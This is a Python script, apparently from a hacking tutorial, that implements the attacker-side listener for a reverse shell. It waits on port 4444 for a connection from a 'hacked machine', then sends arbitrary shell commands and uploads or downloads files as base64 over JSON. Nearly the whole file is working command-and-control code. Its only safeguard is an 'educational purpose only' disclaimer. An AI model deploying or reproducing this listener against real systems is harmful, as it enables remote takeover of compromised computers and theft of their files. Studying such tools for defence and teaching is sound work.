#!/user/bin/env python
"""
Author：Seldon Pang

Listener for incoming connection from the hacked machine
Please use for educational purpose only...
"""

import socket
import json
import base64


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connection.")
        self.connection, address = listener.accept()
        print("[+] Got a connection from " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode('utf-8'))

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode('utf-8', errors="ignore")
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remote_command(self, command):
        self.reliable_send(command)

        if command[0] == "exit":
            self.connection.close()
            exit()

        return self.reliable_receive()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful."

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")

            if command[0] == "upload":
                file_content = self.read_file(command[1])
                command.append(str(file_content))

            result = self.execute_remote_command(command)

            if command[0] == "download" and "[-] Error" not in result:
                result = self.write_file(command[1], result)

            print(result)


# Replace ip with your ip and port of your choice
my_listener = Listener("192.168.1.24", 4444)
my_listener.run()
